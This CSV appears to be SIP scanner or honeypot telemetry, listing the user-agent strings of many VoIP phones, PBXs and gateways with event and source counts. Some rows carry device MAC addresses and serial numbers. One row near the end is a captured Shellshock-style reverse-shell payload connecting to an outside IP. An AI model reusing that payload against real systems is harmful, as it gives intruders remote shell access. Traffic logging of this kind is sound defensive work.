sip_user_agent,events,unique_src
AVM FRITZ!Box Fon WLAN 7170 (UI) 29.04.88 (Feb  9 2014),6,2
AVM FRITZ!Box Fon 5050 (UI) 12.04.31 (Feb  5 2007),6,2
TrueConf Server 5.3.8.12,6,2
TrueConf Server 5.4.8.1010,6,2
Grandstream UCM6304AV1.2A 1.0.27.23,6,2
AVM FRITZ!Box Fon WLAN 7170 Annex A 58.04.84 (Apr  4 2011),6,3
AVM FRITZ!Box 7312 (UI) 117.05.23 (Jun  1 2012),6,2
AIO120/1.55.3.0 2021-11-15 13:51:20 CST +0800,6,2
VitalPBX,6,2
VoIP IP Phone 2.4.12.3 00:a8:59:eb:d7:fd,6,4
VPN2VOIP,6,3
Grandstream UCM6302AV1.1A 1.0.25.7,6,3
Grandstream UCM6302AV1.1A 1.0.25.9,6,2
AGFEO int SIP V5.2g (DATE=03.06.26 19:12  MAC=0009406F0B90),6,2
Stampede,6,2
F660/V2.30.20P8T6S,6,1
Karel IPX,6,2
KarelAutoCallv1.0,6,3
KX-VC1300_HDVC-MPCS 5.50 (Profile=5),6,3
Grandstream UCM6301V1.2C 1.0.19.9,6,1
VOX30/XS_3.7.04.17,6,2
AVM FRITZ!Box 5590 Fiber 272.08.25 (Jun 12 2026),6,2
Slican macvoip,6,2
Slovanet SIP-Proxy 13.X,6,3
Slican IPM,6,4
Asterisk PBX 11.6-cert6,6,2
Sphairon-SL5501-4.38.2.06.02,6,2
Sphairon-SL5501-4.38.2.06.04,6,2
Asterisk PBX 13.21.1-vici,6,2
Asterisk PBX 13.1.0~dfsg-1.1ubuntu4,6,3
V360AJR9b1,6,5
Grandstream UCM6302V1.3A 1.0.23.17,6,3
Grandstream UCM6302V1.3A 1.0.27.15,6,4
Grandstream UCM6302V1.3A 1.0.33.30,6,3
ASTPP,6,3
AUDC-IPPhone/2.2.16.589 (405-Rev2; 00908FBB6443),6,2
Speedport W 920V 65.04.79 (Feb 12 2014),6,4
Slican cct2cpu,6,1
WVP-Pro v2.6.8.20230512,6,3
VosPower V3.1.1.10,6,3
Vpot-30 iPBX System,6,2
Grandstream UCM6301V1.2C 1.0.25.9,6,3
WVP-Pro v2.6.9.20230621,6,3
WVP-Pro v2.6.9.20230725,6,2
WVP-Pro v2.6.9.20230915,6,3
WVP-Pro v2.6.9.20231027,6,2
Slican ITS,6,2
Slican NCP 1.15.0290,6,2
Voclarion Voclarion PBX,6,3
Vonex,6,2
FPBX-16.0.41.1(18.16.0),6,2
WEB-200,6,2
WVP-Pro v2.1.0.20250418,6,2
WVP-Pro v2.6.6.20231009,6,2
Linksys/SPA942-5.1.15(a),6,2
Asterisk PBX 13.29.2-vici,6,3
Asterisk PBX 13.26.0,6,3
Sippy Softswitch v5.1-PRODUCTION.208,6,2
Sipteco PBX,6,2
LifeSize UVC_Multipoint/LS_MP_2.0.1.53 (53),6,2
Asterisk PBX 15.1.4,6,3
Asterisk PBX 15.7.4,6,4
AGFEO int SIP V5.2g (DATE=03.06.26 19:12  MAC=0009406F1449),6,2
AGFEO int SIP V5.2g (DATE=03.06.26 19:12  MAC=0009406F2055),6,2
FPBX-16.0.40.7(20.5.1),6,2
FPBX-16.0.41(18.20.2),6,2
Grandstream UCM6302AV1.1A 1.0.31.7,6,3
LiveGBS v210903,6,3
LiveGBS v230714,6,2
LiveGBS v250613,6,2
WVP-Pro v2.7.4.2026-01-07T08:55:20Z,6,2
Grandstream UCM6301V1.3A 1.0.27.20,6,2
Xontel/2.55.3.3 2023-05-12 17:16:50 CST +0800,6,1
Wildix GW08 (3.0.2.23823-mu8.1),6,1
XMS/5.2.5+38703,6,2
WVP-Pro v2.7.4.2026-07-08T06:31:05Z,6,2
Welltime PBX 11,6,3
FPBX-16.0.45(18.14.0),6,2
Elite1x,6,2
Enswitch,6,2
SipGatewayDBASP (Version 6.1.4.0 Released Build),6,2
Sippy Softswitch v3.0.62,6,2
FPBX-17.0.19.27(21.5.0),6,2
FPBX-17.0.19.28(22.5.0),6,2
Grandstream UCM6208V1.4A 1.0.20.44,6,1
AGFEO int SIP V5.1h (DATE=30.09.25 22:41  MAC=0009406F120F),6,2
Asterisk PBX 16.8.0-7.8.2.rl.102379.2032957,6,2
Asterisk PBX 18.0.1,6,2
Asterisk PBX 18.12.1,6,2
Asterisk PBX 16.5.0,6,3
Asterisk PBX 16.6.0,6,4
Asterisk PBX 16.15.0,6,2
Sagem / HW_V0.0.1 / FW_V58903C-58C040 / SW_V1.2.344,6,3
Sagem / HW_V0.0.1 / FW_V58C040-58C040 / SW_V1.2.344,6,2
Grandstream UCM6301V1.2C 1.0.9.10,6,3
Grandstream UCM6301V1.3A 1.0.19.10,6,3
Linksys/RT31P2-3.1.9(LId),6,3
SIPTester/2.0,6,1
SIParator/4.10.2,6,2
SONUS SBCSWeLite 9.0.2v295  ESXi Ribbon SBC Edge,6,2
M800B/v.7.20A.259.221,6,2
Sagem / HW_V1 FW_V60R109-60A022 / SW_V1.2.261.71,6,2
SIP-6328-4-v4.2.89-sip3148941499/v2.0 Enabled,6,2
DnakeVoip v2.0,6,2
DentalKeramik,6,1
Digium Gateway,6,2
SIP UAS V2.1.4.566053,6,2
SERVER/1.0,6,3
SIP AG,6,2
SIP Server,6,3
Deltapath frSIP UC 5.1.3,6,4
Deltapath frSIP UC 5.3.2,6,2
SIP UAS V3.0.0.896433,6,2
SIP UAS V3.0.0.954271,6,2
Asterisk PBX 18.9.0-7.8.4.rl.102588.97e8b02,6,2
Asterisk PBX 18.9.0-7.9.3.rl.102789.97e8b02,6,3
Deltapath frSIP UC 5.3.4,6,3
SIP-6328-2Re-v4.2.79-5185617545/v2.0 Enabled,6,1
Yealink SIP-T30P 124.86.0.40,6,3
Yealink SIP-T21P_E2 52.84.0.125,6,2
FPBX-17.0.19.23(20.10.0),6,2
FPBX-17.0.19.24(21.5.0),6,3
Grandstream UCM6208V1.6A 1.0.20.41,6,1
FPBX-17.0.19.25(21.7.0),6,2
Sippy Softswitch v4.2-PRODUCTION.0.105,6,2
Asterisk PBX 18.25.0,6,3
Yealink SIP-T21P_E2 52.82.0.20,6,4
FPBX-16.0.45(18.26.2),6,3
AGFEO int SIP V4.2 (DATE=24.02.25 14:28  MAC=0009406F0CA8),6,1
Yeastar S100-65.16.0.183,6,3
AGFEO int SIP V5.1h (DATE=01.10.25 00:04  MAC=0009408A028F),6,2
AGFEO int SIP V5.1h (DATE=04.09.25 13:41  MAC=0009405D19A6),6,3
AGFEO int SIP V4.2a (DATE=28.05.25 02:34  MAC=0009406E0F49),6,2
FPBX-16.0.45(20.17.0),6,3
AGFEO int SIP V4.2 (DATE=24.02.25 14:28  MAC=0009405D1A4B),6,3
Grandstream UCM6204V1.4A 1.0.20.23,6,4
Grandstream UCM6204V1.4A 1.0.20.49,6,2
Grandstream UCM6204V1.4A 1.0.20.52,6,3
Grandstream UCM6202V1.5B 1.0.20.49,6,2
Grandstream UCM6202V1.7A 1.0.20.23,6,1
MATRIX SARVAM UCS SME V1R7.2.0,6,3
MATRIX SARVAM UCS SOHO V1R6.7.2,6,2
Yealink W70B 146.85.0.55,6,2
AGFEO int SIP V4.1d (DATE=27.05.24 20:14  MAC=0009407E0C25),6,2
AGFEO int SIP V4.1d (DATE=27.05.24 20:14  MAC=0009405C146A),6,1
AGFEO int SIP V4.1d (DATE=27.05.24 20:14  MAC=0009406E12B1),6,1
AGFEO int SIP V4.1b (DATE=07.12.23 19:09  MAC=0009406E198A),6,2
Yealink W70B 146.87.25.1,6,3
Yeastar S100-65.16.0.41,6,2
AGFEO int SIP V4.1d (DATE=27.05.24 21:34  MAC=000940880755),6,2
Dahua UAS/3.0 VTO6221E,6,3
FPBX-17.0.19.32(20.18.2),6,2
Grandstream UCM6202V1.2A 1.0.20.48,6,3
Yeastar P520,6,2
Yeastar P560,6,2
Yealink W52P 25.81.119.1,6,4
Yealink W60B 77.83.0.20,6,3
Yealink W60B 77.83.0.25,6,2
RingReach,6,2
SIP UAS V3.0.0.2160897,6,3
SIP UAS V3.0.0.1049939,6,1
SIP UAS V2.1.4.471083,6,2
SIP UAS V2.1.4.500306,6,2
SIP UAS V3.0.0.1809282,6,2
Deltapath frSIP UC 4.3.1,6,2
Dahua UAS/3.0 VTO6100C,6,2
Yeastar S20-30.15.0.125,6,2
Yeastar S20-30.15.0.159,6,3
Grandstream UCM6202V1.4A 1.0.20.53,6,3
AGFEO SIP V5.1h (DATE=30.09.25 22:41  MAC=0009407E0511),6,1
Yeastar S20-65.16.0.216,6,3
AGFEO SIP V3.00.15 n (MAC=0009405C17C0),6,2
FPBX-17.0.19.32(22.8.2),6,2
FPBX-17.0.21(21.10.2),6,3
FPBX-17.0.25(21.10.2),6,2
Yeastar S20-30.15.0.203,6,3
Grandstream UCM6204V1.7A 1.0.20.48,6,3
Grandstream UCM6204V1.4A 1.0.20.53,6,1
Grandstream UCM6204V1.5A 1.0.20.48,6,3
AGFEO SIP V3.00.15 n (MAC=000940701619),6,2
AGFEO SIP V3.00.15 n (MAC=0009407E0311),6,2
AGFEO (IPDECT/05.01.0005)(MAC=000940696EE9)(HW=255),6,2
Meeting Server Unigw 47.2.0.25,6,3
Dahua UAC/3.0 VTOASI4203YO-V3 V1.0.0.0 VTO_Wall SN:7L00CF4PAJF76BC,6,2
Mediant 1000/v.6.60A.228.011,6,2
Mediant 500 - MSBR/v.6.80A.317.001,6,2
Mediateknik-C530IP/42.231.00.000.000,6,2
SBC,6,3
RV/V9.2.2.37 XT5000,6,2
Grandstream HT818 1.0.65.1,6,3
MSBR500L_23032017/v.6.80A.369.004,6,3
Mitel Border GW(MBG/11.3.0.47 TUG/4.14.0.26-01),6,1
Dahua UAS/3.0 VTO2211G-P,6,4
Dahua UAS/3.0 VTO2211G-WP,6,2
Dahua UAS/3.0 VTO2211G-WP-S2,6,2
MagnusBilling,6,2
Matrix VoIPServer ME_PE_GE_8 V2R11,6,2
MNCBANK,6,1
FPBX-17.0.24(20.6.0),6,4
Yeastar S50-30.15.0.216,6,3
Yeastar S412-30.15.0.159,6,4
Yeastar S50-30.15.0.102,6,3
Yeastar S300-30.15.0.115,6,2
FPBX-17.0.25(21.4.3),6,2
Grandstream HT814 1.0.41.2,6,2
ADTRAN_Total_Access_908e_2nd_Gen/R12.3.2.E,6,3
Dahua UAC/3.0 VTOASI6213J-MW V2.0.0.0 VTO_Wall SN:7C0301BPAJDC575,6,2
FPBX-17.0.30(21.12.0),6,2
Yeastar S300-30.15.0.201,6,1
Yeastar S300-30.15.0.211,6,2
Yeastar S300-65.16.0.11,6,1
FPBX-17.0.21.7(20.10.0),6,2
FPBX-17.0.23(21.4.1),6,3
FPBX-17.0.23(22.5.2),6,3
Mitel Border GW/4.11.0.188-01,6,3
Mitel Border GW/4.2.0.15,6,3
RG-1404GF-W/1.12.4 SN/VI25029970 sofia-sip/1.12.10,6,2
RG-5421G-Wac/2.4.2.87 SN/VI46001585 sofia-sip/1.12.10,6,2
RG-1404GF-W/1.11.0 SN/VI25025968 sofia-sip/1.12.10,6,2
Asterisk PBX 20.9.2,6,3
Dahua UAS/3.0 VTO2000A,6,2
Dahua UAS/3.0 VTO2111D-P-S2,6,3
Grandstream UCM6202V1.5A 1.0.20.30,6,3
ReadyNet_AC1200MS,6,2
Mediateknik-C530IP/42.245.00.000.000,6,3
RG-1404GF-W/1.11.0 SN/VI25027696 sofia-sip/1.12.10,6,1
RG-1404GF-W/1.11.0 SN/VI25018692 sofia-sip/1.12.10,6,1
RG-1404GF-W/1.11.0 SN/VI25020213 sofia-sip/1.12.10,6,2
RG-1404G/1.9.2 SN/VI0E005112 sofia-sip/1.12.10,6,1
Mitel Border GW/4.11.0.177-01,6,2
FPBX-2.11.0(1.8.15.0),6,2
ADTRAN_Total_Access_908e_2nd_Gen/R13.6.0.E,6,2
ADTRAN_Total_Access_908e_2nd_Gen/R14.2.0.E,6,3
ADTRAN_Total_Access_908e_3rd_Gen/R10.9.4.E,6,2
FPBX-17.0.28(20.7),6,2
FPBX-17.0.28(21.10.2),6,2
Grandstream SoftwareUCM 1.0.33.7,6,3
ZYXEL LTE3316-M604 2.00(ABMP.7)C0,6,2
Quintum/1.0.0 SN/0030E14004AA SW/P107-09-10,6,2
Asterisk PBX 23.3.0,6,1
Asterisk PBX GIT-13-13.15.0-rc1-1774-g7b898dd,6,2
Asterisk PBX GIT-20-ceebc90,6,2
Mitel Border GW(MBG/12.3.0.161 TUG/4.26.0.107-01),6,2
Mitel Border GW/4.11.0.160-01,6,2
Mitel Border GW(MBG/12.1.0.110 TUG/4.22.0.68-01),6,2
FPBX-2.11.0(1.8.13.0),6,3
PolycomVVX-VVX_411-UA/6.4.4.3178,6,3
PolycomVVX-VVX_410-UA/5.9.1.0615_0004f2cf14d4,6,3
PolycomVVX-VVX_410-UA/5.9.7.3480,6,4
PolycomVVX-VVX_411-UA/5.9.8.5760_64167fbf652c,6,2
Asterisk PBX 22.9.0,6,2
Asterisk PBX 22.9.0+dfsg+~cs6.16.60671434-1,6,2
Asterisk PBX 23.2.2,6,2
PolycomVVX-VVX_600-UA/5.9.6.2327_0004f2bc6dc6,6,3
Yeastar S50-30.15.0.201,6,3
FPBX-17.0.25(22.5.2),6,3
FPBX-17.0.25(22.7.0),6,1
FPBX-17.0.28(18.10.0),6,2
FPBX-17.0.28(20.14.1),6,4
Dahua UAC/3.0 VTOASI6214S-W V1.0.0.0 SN:5PGM1600201XS,6,1
Asterisk PBX 20.8.1,6,3
PortSIP UC - Call Manager 12.6.4.20,6,2
PolycomVVX-VVX_310-UA/5.9.8.5760_0004f28de921,6,2
Mitel Border GW/4.9.0.86-01,6,2
Mitel Border GW/4.9.1.22-01,6,2
Grandstream GXW4501V1.5A 1.0.1.11,6,2
Grandstream GXP2130 1.0.4.10,6,2
ADTRAN_Total_Access_900e_3rd_Gen/R14.4.2.E,6,4
FPBX-17.0.30(22.3.0),6,2
ADTRAN_Total_Access_908_2nd_Gen/R12.3.0.SA.E,6,3
Asterisk PBX certified/16.8-cert2,6,3
PolycomVVX-VVX_250-UA/6.0.0.4796,6,2
PolycomVVX-VVX_300-UA/5.9.7.4477,6,2
Asterisk PBX UNKNOWN__and_probably_unsupported,6,1
Mitel Border GW/4.7.0.9-01,6,3
Mitel Border GW/4.7.1.5-01,6,3
DH-3,6,2
DIAL-Asterisk,6,3
ZXDSL 931VII/V2.0.00.OTET03,6,2
Grandstream HT812 1.0.53.3,6,2
FPBX-17.0.28(22.8.2),6,3
FPBX-17.0.30(20.15.0),6,2
Mitel Border GW(MBG/11.5.1.24 TUG/4.17.0.19-01),6,1
Mitel Border GW(MBG/11.6.0.119 TUG/4.18.0.71-01),6,2
QVI-2104.v2 QVI 91.19.10.11,6,3
NEC SL2100 01.04.01/2.1,6,2
ZYXEL VMG8825-B50B V5.13(ABNY.0)C0,6,4
ADTRAN_Total_Access_916_2nd_Gen/A4.11.00.E,6,3
ADTRAN_Total_Access_908e_3rd_Gen/R13.6.0.E,6,1
ADTRAN_Total_Access_908e_3rd_Gen/R14.3.1.E,6,3
FPBX-17.0.28(22.4.1),6,2
Grandstream HT802V2 1.0.9.3,6,2
Grandstream HT812 1.0.21.4,6,2
Grandstream HT812 1.0.29.8,6,3
DAG1000-2S DAG 2.19.10.08,6,2
MyPBX,6,2
Auerswald COMpact 5000/8.4F000,6,1
NF_CRM,6,2
NTE-RG-1402F build 6.3.1 SN:GE07005645 sofia-sip/1.12.10,6,2
NTE-RG-1402FC build 5.0.0 SN:TG0A000452 sofia-sip/1.12.10,6,3
CommuniGatePro/6.4.0,6,4
Auerswald COMpact 5200R/8.4B000,6,2
Pirelli Broadband Solutions/Discus Platform/PRGE4202G_TEL_4.3.2.0243,6,2
Polycom/5.5.0.20556 PolycomVVX-VVX_301-UA/5.5.0.20556,6,2
Auerswald COMpact 4000/8.2B000,6,2
Auerswald COMpact 4000/8.4F000,6,1
Auerswald COMpact 4000/8.6C000,6,3
Audiocodes-Sip-Gateway-Mediant 1000/v.6.00AL.018.003,6,1
DAG1000-4S DAG 2.19.10.16,6,2
DCOMFS/2.0,6,4
Pexip Infinity Conferencing Platform/21.1 (48372.0.0),6,2
Patton SN4131/4BIS8VHP 00A0BA12B3E4 3.22.2-24123 1.8 M5T SIP Stack/4.2.28.153,6,2
Patton SN4131/4BIS8VHP 00A0BA12D5DD 3.22.2-24123 1.8 M5T SIP Stack/4.2.28.153,6,3
Patton SN4131/2BIS4VHP 00A0BA123C54 3.22.1-24062 1.8 M5T SIP Stack/4.2.28.153,6,2
PolyEdge-Edge_E400-UA/8.3.0.15436_48256765d5a4,6,2
Pexip Infinity Conferencing Platform/39.1 (83067.0.0),6,2
PhonerLite/3.20,6,3
PhonerLite/3.32,6,2
FPBX-2.11.0(11.10.0),6,2
Grandstream HT801 1.0.3.7,6,2
FPBX-2.10.1(1.8.15.1),6,3
ADTRAN_Total_Access_908e_2nd_Gen/R10.9.2.E,6,3
Grandstream HT802 1.0.57.1,6,3
FPBX-2.11.0(13.30.0),6,3
DNL-Switch,6,3
Patton SN4552 2BIS EUI 00A0BA0633A0 R5.6 2011-03-10 SIP M5T SIP Stack/4.0.29.29,6,3
Grandstream GXP1610 1.0.4.128,6,2
Grandstream GXP1610 1.0.7.64,6,2
FPBX-2.8.1(1.8.12.0),6,2
dlink 12-3889-9233-1.3.2.102-OGC200W,6,2
Grandstream GXW4501V1.4A 1.0.0.35,6,2
Grandstream GXW4501V1.4A 1.0.1.13,6,2
NEC SV9100-GE 14.10.50,6,2
NEC SV9100-NA 06.00.60/2.1,6,3
dlink 12-38-43929367-0.9.5.1.1928-PBX6S,6,1
dlink 12-3856-2886-0.10.26.1-DSLX,6,3
behnke-station/5.26,6,3
centrala2,6,3
cloud.taxi.kz,6,2
cs210,6,2
dSIPRouter/0.77,6,2
FPBX-2.8.1(11.5.0),6,2
NEC SV9100-NA 13.20.51,6,2
NEC SV9100-NA 14.00.50,6,1
eXosip/3.3.0,6,3
Zycoo-SH30 s2.1.1 68692E210E40,6,2
a-us-central1-a-0.watchtower.com.au,6,5
Grandstream HT801V2 1.0.1.16,6,3
Grandstream HT802 1.0.10.6,6,2
dlink 12-38-39912597-0.10.37.1-TSO,6,1
Auerswald COMpact 5200R/8.6B000,6,2
Auerswald COMpact 5500R/8.4D000,6,3
Avantelecom,6,3
NEC SV9100-GE 09.00.79/2.1,6,4
NEC SV8100-NA 11.00/2.1,6,2
Patton SN4131/2BIS4VHP 00A0BA0F91D9 3.22.2-24123 1.8 M5T SIP Stack/4.2.28.153,6,2
Patton SN4131/2BIS4VHP 00A0BA0FB908 3.22.2-24123 1.8 M5T SIP Stack/4.2.28.153,6,3
BCC/6.0.2,6,3
ADTRAN_TA5000_1187130F1/J74.0023,6,2
dlink 12-3865-5290-1.2.2.82-SP5220S,6,1
Fanvil X210 2.4.19 0c383e12fbe9,6,3
Fanvil X210-V2 2.12.25.6 0c383e71559b,6,2
Gigaset N870 IP PRO/83.V2.61.2+build.eb99619;589EC6586209,6,2
Fanvil V62G 2.12.20.3.1 0c383e724683,6,2
ADTRAN_Total_Access_900e_3rd_Gen/R11.4.3.E,6,3
ADTRAN_Total_Access_362/J74.00.0014.G2,6,2
CloudVOIP,6,2
kamailio (3.1.4 (x86_64/linux)),6,1
kamailio (3.3.1 (x86_64/linux)),6,2
ADTRAN_NetVanta_4148/R14.4.1,6,2
ADTRAN_Total_Access_372/J74.00.0011.G2,6,2
ADTRAN_Total_Access_900_3rd_Gen/R13.9.0.HB.E,6,3
ADTRAN_SDX_631qv/24_4-4-f,6,3
ADTRAN_SDX_632v/25_1-4-d,6,2
PT921CTV350_JS201801,6,3
PT921CTXJV350,6,2
PBXact-17.0.28(22.6.0),6,3
ClearlyIP-16.0.45(16.28.0),6,5
PTInS GR141IG_2226 Build 3GN9030300r32,6,2
Panasonic KX-VC300 3.10 Rev1 (Profile=4,6,2
NEC-i Topaz 07.10/2.1,6,2
ClearlyIP-17.0.30(21.12.1),6,2
PBXact-17.0.28(22.8.2),6,3
PBXact-17.0.30(22.5.2),6,2
Cisco/SRP527-1.2.6(003),6,2
Cisco/SRP541-1.02.00(023),6,3
NetworkSpeaker Rtclib V2.0.2,6,3
Nexo2One/1.0 FreeSWITCH,6,4
Cisco/SPA525G2-7.6.2a,6,2
PBXpress 2.0,6,3
enz build(10:03:33 Apr 24 2024),6,1
interconnect,6,1
A540 IP/42.240.00.000.000,6,2
A540IP/42.247.00.000.000,6,1
galPBX,6,2
gsm2sip-asterisk,6,3
ADTRAN_SDX_601qv/24_2-3-e,6,3
A690 IP/42.248.00.000.000,6,3
Bulutfon Media GW,6,3
BaiduSpeech SofiaSIP 1.5.0,6,3
Cisco/SRP527-1.01.22(VP003),6,2
Cisco/SPA504G-7.4.3a,6,3
NTE-RG-1402G build 6.3.1 SN:TG07011031 sofia-sip/1.12.10,6,3
fw2023020918-OIV65402.N2A3UHM,6,2
eXosip/4.1.0,6,2
elmeg IP120/62.02.00.05;7C2F80617B07,6,4
PBXact-15.0.38(17.9.4),6,2
BasIpVoip v2.0,6,4
Berofix VOIP Gateway (3.0.17),6,2
BiPAC 7800VDOX,6,2
BiPAC 8700VAX,6,2
Neptune-v1,6,3
Breizh VOIP IPBX V2.0,6,2
Bruns,6,3
Grandstream DP750 1.0.15.3,6,2
Fanvil X1S 2.4.12.2 0c:38:3e:43:7d:1b,6,3
Fanvil X1S/X1SP 1.2.0 0c:38:3e:40:c3:f7,6,2
eyeBeam,6,2
NEC-DPD-011-A-XX(NECSIPEXT2MLUA_v1),6,4
ClearVox Nexxt/2.9.0 (hn:hail.fortiddns.com; h:0),6,2
PBXact-15.0.38(16.13.0),6,2
PBXact-15.0.38(16.28.0),6,2
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80EEF368,6,4
Gigaset N530 IP PRO/99.V2.65.0+build.8504c90;589EC68EAAAE,6,2
Gigaset N610 IP PRO/83.V2.62.1+build.d1d6a22;589EC6A679B3,6,3
kamailio (5.4.4 (x86_64/linux)),6,3
kamailio (5.5.2 (x86_64/linux)),6,3
letsclaw-sip/1.0,6,3
A-PBX,6,3
A510 IP/42.075.00.000.000,6,2
PBX Cloud,6,2
Cisco/SPA301-7.5.2,6,4
mikopbx-2022.3.15,6,2
mikopbx-2023.2.206,6,2
mikopbx-2024.2.28-dev,6,2
kamailio (5.7.1 (x86_64/linux)),6,2
Gigaset N670 IP PRO/83.V2.68.0+build.7bb45a2;589EC6517053,6,2
Gigaset N870 IP PRO/83.V2.54.0+build.4a766bb;589EC65ED8A1,6,2
OPAL/1.0alpha0,6,1
PBXact-15.0.38(13.38.3),6,2
ByFly-Relay,6,1
C430 IP/42.228.00.000.000,6,1
NvBx PBX asterisk based,6,2
OBIHAI/OBi300-3.1.2.5896,6,2
OBIHAI/OBi302-3.2.5.8732,6,2
OBIHAI/OBi302-3.2.5.9332,6,3
ADTRAN_NetVanta_3140/R13.5.3,6,3
jarrow,6,3
NTE-RG-1402GC build 5.4.0 SN:TG0B002250 sofia-sip/1.12.10,6,1
NVR build(13:06:31 Jan 22 2025),6,3
OpenSIPS (3.6.7 (x86_64/linux)),6,4
Opticodec7600/5.11.115,6,2
OXO030/051.001 GW_030/063.001,6,2
OXO032/044.001 GW_032/044.001,6,2
056 12-3899-284-1.4.2.252-SP9440S,6,3
OXO060/013.001 GW_060/013.001,6,3
OXO051/020.001 GW_051/020.001,6,3
OXO051/027.001 GW_051/027.001,6,3
OXO052/023.001 GW_052/023.001,6,2
trunk0602.viptel.dk,6,2
051 12-3861-9917-0.9.5.1.2005-PSTN808,6,1
Cisco/SPA112-1.3.3(015),6,2
sjwh sbc v3,6,2
smg_pa_sip 3.23.2.1,6,2
snom725/10.1.175.16 0004138BDEDD,6,5
snomM100KLE/1.0.4.6-0,6,2
056 12-3893-6084-1.3.3.182-SP5220S,6,2
056 12-3893-9880-1.3.2.146-SP9440S,6,3
056 12-3896-12714-1.4.2.252-SP350DS,6,3
056 12-3899-230-1.4.2.252-SP9440S,6,3
2N IP Solo 2.30.1.39.6,6,3
OpenSIPS (3.4.8 (x86_64/linux)),6,2
OpenSIPS (3.4.9 (x86_64/linux)),6,3
OpenSIPS (3.5.8 (x86_64/linux)),6,3
yeti-switch 1.13.109core162,6,3
www.te-systems.de XCAPI V4.0.31.0,6,2
voicecore,6,1
056 12-37-1925424,6,2
FreeSWITCH-mod_sofia/1.10.12~64bit,6,3
FreeSWITCH-mod_sofia/1.10.13-dev+git~20260116T201023Z~88fa1f95ca~64bit,6,2
FreeSWITCH-mod_sofia/1.10.3-release~64bit,6,2
mingke@zhfreeview,6,2
FreeSWITCH-mod_sofia/1.6.15+git~20170308T013654Z~d387db229d~64bit,6,2
FreeSWITCH-mod_sofia/1.11.1-release-26476433763-c2c59645f6~64bit,6,3
FreeSWITCH-mod_sofia/1.11.1-release~64bit,6,3
FreeSWITCH-mod_sofia/1.11.1-release~c2c59645f6~64bit,6,1
FPBX-15.0.37.9(16.17.0),6,2
FPBX-15.0.37.9(16.19.0),6,2
FPBX-15.0.37.4(18.9),6,3
FPBX-15.0.38(16.19.0),6,2
FPBX-15.0.38(16.21.1),6,1
Technicolor TG799vn v2 Build 10.5.2.T.JF,6,2
FPBX-15.0.38(16.13.0),6,4
FPBX-15.0.38(16.15.1),6,3
TEC-PBX,6,3
AddPac AP2120N_G2 8.41.092,6,3
Allcam Dev Server,6,3
Akuvox R20A 220.30.3.7 0C110512A977,6,3
Akuvox R20K 320.30.11.63 0C11052B8653;akdoor,6,1
Abilis CPX - Ver. 7.10.6/STD - Build 3858.14 - Branch 7.10,6,2
Aastra 6867i/4.2.0.2023,6,3
TTNC/,6,2
Flexisip/2.4.4 (sofia-sip-nta/2.0),6,3
Flexisip/2.5.0-beta-126-g89bffe66 (sofia-sip-nta/2.0),6,3
FlySIP SoftSwitch v2023-PRODUCTION.450,6,3
youhua;PT926E;V6.1.00;V3.00.926R2002;E8C-E141,6,4
201 12-38-28927539-0.9.5.1.1238-PSTN404,6,2
perse,6,2
sippy v2023-PRODUCTION.453,6,3
IDLess,6,4
Cisco-CP-8861-3PCC/12.0.7,6,4
Cisco-SIPGateway-VG420-144FXS/IOS-17.18.1a/88:9C:AD:A4:B7:60,6,3
Cisco-SIPGateway/IOS-10.3.123,6,3
2N IP Verso 2.43.0.56.2,6,3
2N IP Verso 2.43.1.56.3,6,2
2N IP Verso 2.50.1.76.4,6,2
Fanvil i12 2.8.2.7009 0c383e348861,6,2
nfvpbx,6,2
snomM700/04.50.0011 (MAC=00041361EB27; SER= 00000; HW=255),5,1
() { :;}; bash -i >& /dev/tcp/88.216.61.255/5060 0>&1,5,1
sofia-sip/1.12.9,5,2
128 12-395-286-1.4.2.252-SP5250SO,5,3
uCsip_R8.44.2236_IVer60.65Dbg,5,2
051 12-3888-9213-1.3.2.98-SP9440OP,5,2
Grandstream UCM6202V1.7A 1.0.20.53,5,2
Grandstream UCM6204V1.2B 1.0.20.23,5,2
Grandstream UCM6204V1.3A 1.0.20.22,5,3
Yeastar S20-30.15.0.179,5,3
Grandstream UCM6204V1.4A 1.0.20.44,5,2
OXO060/022.001 GW_060/022.001,5,2
Cisco-ATA191-MPP/11-2-3MPP0001-028,5,3
Cisco-ATA191-MPP/11-2-3MPP0001-028 (687909eb20bc) (SWVER),5,1
Cisco-ATA192-MPP/11-1-0MES12,5,2
Cisco-ATA192-MPP/11-1-0MPP0401-002,5,3
OXO061/016.001 GW_061/016.001,5,2
Cisco-ATA191-MPP/11-1-0MSR3-9,5,2
CALIX GS4227W/25.2.0.0.44,5,1
CALIX GS5229XG/26.1.0.0.30,5,2
CF60,5,1
Cisco-ATA192-MPP/11-2-4MPP0001-115,5,2
